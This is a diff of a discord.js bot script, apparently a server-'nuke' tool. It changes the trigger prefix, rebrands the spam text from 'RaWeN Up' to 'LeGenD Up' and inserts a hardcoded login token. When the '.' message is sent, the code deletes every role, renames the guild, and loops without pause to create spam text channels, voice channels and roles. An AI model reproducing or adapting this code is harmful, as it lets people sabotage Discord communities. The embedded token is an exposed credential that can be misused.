@@ -1,6 +1,6 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
-const prefix = ".";
+const prefix = ":";
 client.on("message", message => {
   if (message.content === ".") {
     if (message.channel.guild) {
@@ -15,14 +15,14 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("RaWeN Up");////nawek dane bo sar server 
+      message.guild.setName("LeGenD Up");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("RaWeN Up", "text");///////bo channel 
-        message.guild.createChannel("RaWeN Up", "voice");////bo voice
-        message.guild.createRole({ name: "RaWeN Up" });////nawek dane bo role kan
+        message.guild.createChannel("LeGenD Up", "text");///////bo channel 
+        message.guild.createChannel("LeGenD Up", "voice");////bo voice
+        message.guild.createRole({ name: "LeGenD Up" });////nawek dane bo role kan
       });
     }
   }
 });
 
-client.login("")
+client.login("zhT-Zf9Ofb3ubIPUvZF0mljiw1tNutnX")
